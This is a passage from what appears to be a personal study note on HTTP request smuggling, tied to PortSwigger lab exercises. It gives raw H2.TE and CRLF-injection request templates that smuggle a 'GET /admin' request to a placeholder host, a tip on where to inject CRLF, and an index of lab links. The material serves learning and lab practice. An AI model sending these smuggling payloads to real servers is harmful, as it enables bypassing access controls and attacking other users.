  <div className="green">GET / HTTP/2</div>
  <div className="green">Host: vulnerable-website.com</div>
  <div className="green"></div>
  <div className="green"></div>
</div>

2. H2.TE

Attack

<div className="httpRawRequest">
  <div className="blue">POST / HTTP/2</div>
  <div className="blue">Host: vulnerable-website.com</div>
  <div className="blue">Transfer-Encoding: chunked</div>
  <div className="blue"></div>
  <div className="blue">0</div>
  <div className="blue"></div>
  <div className="orange">GET /admin HTTP/1.1</div>
  <div className="orange">Foo: bar</div>
</div>

Normal

<div className="httpRawRequest">
  <div className="green">GET / HTTP/2</div>
  <div className="green">Host: vulnerable-website.com</div>
  <div className="green"></div>
  <div className="green"></div>
</div>

3. H2 CRLF Injection

Attack (H2.TE)

<div className="httpRawRequest">
  <div className="blue">POST / HTTP/2</div>
  <div className="blue">Host: vulnerable-website.com</div>
  <div className="blue">Foo: bar\r\nTransfer-Encoding: chunked</div>
  <div className="blue"></div>
  <div className="blue">0</div>
  <div className="blue"></div>
  <div className="orange">GET /admin HTTP/1.1</div>
  <div className="orange">Foo: bar</div>
</div>

Normal

<div className="httpRawRequest">
  <div className="green">GET / HTTP/2</div>
  <div className="green">Host: vulnerable-website.com</div>
  <div className="green"></div>
  <div className="green"></div>
</div>

:::info
Try inject \r\n at any part (header name, header value, pesudo header, path)
:::

### Document & Labs

- HTTP/1.1
  - CL.TE
    - [Time Delay](../port-swigger/http-request-smuggling.md#finding-clte-vulnerabilities-using-timing-techniques)
      <!-- - [GPOST](../port-swigger/http-request-smuggling.md#lab-basic-clte-vulnerability) -->
      <!-- - [/404](../port-swigger/http-request-smuggling.md#lab-confirming-a-clte-vulnerability-via-differential-responses) -->
      <!-- - [CL.TE (3) bypass front-end security controls](../port-swigger/http-request-smuggling.md#lab-exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability) -->
  - TE.CL
    - [Time Delay](../port-swigger/http-request-smuggling.md#finding-tecl-vulnerabilities-using-timing-techniques)
      <!-- - [GPOST](../port-swigger/http-request-smuggling.md#lab-basic-tecl-vulnerability) -->
      <!-- - [/404](../port-swigger/http-request-smuggling.md#lab-confirming-a-tecl-vulnerability-via-differential-responses) -->
    - [obfuscating the TE header](../port-swigger/http-request-smuggling.md#lab-tecl--obfuscating-the-te-header)
        <!-- - [TE.CL (3) bypass front-end security controls](../port-swigger/http-request-smuggling.md#lab-exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability) -->
      <!-- - [TE.TE (obfuscating the TE header)](../port-swigger/http-request-smuggling.md#lab-tecl--obfuscating-the-te-header) -->
      <!-- - [0.CL (EXPERT)](../port-swigger/http-request-smuggling.md#lab-0cl-request-smuggling) -->
  - Browser-powered
    - [CL.0](../port-swigger/http-request-smuggling.md#lab-cl0-request-smuggling)
      <!-- - [Document](../port-swigger/http-request-smuggling.md#testing-for-cl0-vulnerabilities) -->
      <!-- - [1](../port-swigger/http-request-smuggling.md#lab-cl0-request-smuggling) -->
    - client side desync
      - [Document](../port-swigger/http-request-smuggling.md#what-is-a-client-side-desync-attack)
      - [1 (EXPERT)](../port-swigger/http-request-smuggling.md#lab-client-side-desync)
    - Server-side pause-based desync
      - [Document](../port-swigger/http-request-smuggling.md#pause-based-desync-attacks)
      - [1 (EXPERT)](../port-swigger/http-request-smuggling.md#lab-server-side-pause-based-request-smuggling)
- HTTP/2
  - [H2.CL + Web Cache Poisoning](../port-swigger/http-request-smuggling.md#lab-h2cl-request-smuggling)
  - [H2.TE + CRLF Injection](../port-swigger/http-request-smuggling.md#lab-h2te-via-crlf-injection)
  - [H2.TE](../port-swigger/http-request-smuggling.md#h2te-vulnerabilities)
      <!-- - [Response queue poisoning](../port-swigger/http-request-smuggling.md#response-queue-poisoning) -->
      <!-- - [H2.TE + Response queue poisoning](../port-swigger/http-request-smuggling.md#lab-response-queue-poisoning-via-h2te) -->
      <!-- - [request splitting](../port-swigger/http-request-smuggling.md#http2-request-splitting) -->
      <!-- - [request splitting + CRLF Injection](../port-swigger/http-request-smuggling.md#lab-http2-request-splitting--response-queue-poisoning-via-crlf-injection) -->
      <!-- - request tunnelling -->
        <!-- - [Document](../port-swigger/http-request-smuggling.md#http-request-tunnelling) -->
        <!-- - [Leaking internal headers](../port-swigger/http-request-smuggling.md#leaking-internal-headers-via-http2-request-tunnelling) -->
        <!-- - [Blind](../port-swigger/http-request-smuggling.md#blind-request-tunnelling) -->
        <!-- - [Non-blind request using HEAD](../port-swigger/http-request-smuggling.md#non-blind-request-tunnelling-using-head) -->
        <!-- - [Bypassing access controls (EXPERT)](../port-swigger/http-request-smuggling.md#lab-bypassing-access-controls-via-http2-request-tunnelling) -->
        <!-- - [Web cache poisoning (EXPERT)](../port-swigger/http-request-smuggling.md#lab-web-cache-poisoning-via-http2-request-tunnelling) -->
    <!-- - Revealing front-end request rewriting -->
      <!-- - [Document](../port-swigger/http-request-smuggling.md#revealing-front-end-request-rewriting) -->
      <!-- - [1](../port-swigger/http-request-smuggling.md#lab-clte--front-end-request-rewriting) -->
    <!-- - Capturing other users' requests -->
      <!-- - [Document](../port-swigger/http-request-smuggling.md#capturing-other-users-requests) -->
      <!-- - [1](../port-swigger/http-request-smuggling.md#lab-clte--capture-other-users-requests) -->
    <!-- - [User Agent Reflected XSS](../port-swigger/http-request-smuggling.md#lab-clte--deliver-reflected-xss) -->
    <!-- - [Web Cache Poisoning (EXPERT)](../port-swigger/http-request-smuggling.md#lab-clte-web-cache-poisoning) -->
    <!-- - [Web Cache Deception (EXPERT)](../port-swigger/http-request-smuggling.md#lab-clte-web-cache-deception) -->

<!-- ## Essential skills

### Obfuscation
- URL encoding
- double URL encoding
- HTML encoding
- XML encoding
- unicode escaping
- hex escaping
- octal escaping
- multiple encodings -->

<!-- solved practitioner labs 2 times:
- ssrf
- os command
- ssti

體感最難的:
- [Deserialization](#deserialization)
- [Host](#http-host-header-attacks)
- [Web Cache Poisoning](#web-cache-poisoning)
- [Web Cache Deception](#web-cache-deception)
- [Race Conditions](#race-conditions)
- [HTTP Request Smuggling](#http-request-smuggling) -->
